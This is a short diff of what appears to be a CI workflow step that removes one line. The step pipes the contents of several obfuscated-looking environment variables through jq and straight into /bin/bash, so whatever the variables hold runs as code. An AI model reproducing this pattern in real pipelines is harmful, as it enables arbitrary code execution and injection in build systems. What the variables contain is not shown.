@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$z207" | jq -r .cua8 | /bin/bash
           echo $x832 | jq -r .j241 | /bin/bash
           echo $dbrkt87576 | jq -r .ox653 | /bin/bash
-          echo $npb933 | jq -r .s758 | /bin/bash
           printf '%s' "$mp2293" | jq -r .l6007 | /bin/bash
 
       - name: Archive output
